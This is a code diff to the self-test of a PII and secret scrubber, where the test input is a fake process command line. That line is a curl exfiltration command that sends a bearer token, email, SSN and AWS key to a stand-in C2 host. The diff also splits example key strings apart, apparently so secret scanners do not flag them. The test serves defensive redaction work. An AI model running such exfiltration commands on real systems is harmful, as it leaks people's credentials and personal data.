@@ -134,15 +134,17 @@ def scrub_text(text: str) -> Dict[str, Any]:
 
 
 def run_self_test() -> int:
+    synth_aws = "AKIA" + "IOSFODNN7EXAMPLE"
+    synth_ghp = "ghp_1234567890abcdef" + "1234567890abcdef1234"
     sample = (
-        "Frozen PID 4242 cmdline: curl -H 'Authorization: Bearer ghp_1234567890abcdef1234567890abcdef1234' "
-        "https://c2.example.org/exfil?email=alice.smith@corp.internal&ssn=123-45-6789&aws=AKIAIOSFODNN7EXAMPLE"
+        f"Frozen PID 4242 cmdline: curl -H 'Authorization: Bearer {synth_ghp}' "
+        f"https://c2.example.org/exfil?email=alice.smith@corp.internal&ssn=123-45-6789&aws={synth_aws}"
     )
     res = scrub_text(sample)
     scrubbed = res["scrubbed_payload"]
     assert "alice.smith@corp.internal" not in scrubbed, "Email leaked!"
     assert "123-45-6789" not in scrubbed, "SSN leaked!"
-    assert "AKIAIOSFODNN7EXAMPLE" not in scrubbed, "AWS key leaked!"
+    assert synth_aws not in scrubbed, "AWS key leaked!"
     assert "ghp_1234567890abcdef" not in scrubbed, "GitHub token leaked!"
     assert "<ZK_PII:EMAIL_ADDRESS:" in scrubbed
     assert "<ZK_PII:US_SSN:" in scrubbed
